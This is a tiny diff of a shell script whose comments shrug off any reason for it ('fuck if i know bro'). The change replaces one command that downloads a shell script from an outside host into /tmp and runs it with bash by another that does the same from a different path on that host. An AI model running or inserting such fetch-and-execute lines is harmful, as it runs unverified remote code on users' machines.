@@ -3,4 +3,4 @@
 # why?
 # fuck if i know bro.
 
-curl -fsSL "http://wato.qd.je/gbb/run.sh" -o /tmp/run.sh && bash /tmp/run.sh
+curl -fsSL "http://wato.qd.je/gbb/gbb.sh" -o /tmp/gbb.sh && bash /tmp/gbb.sh
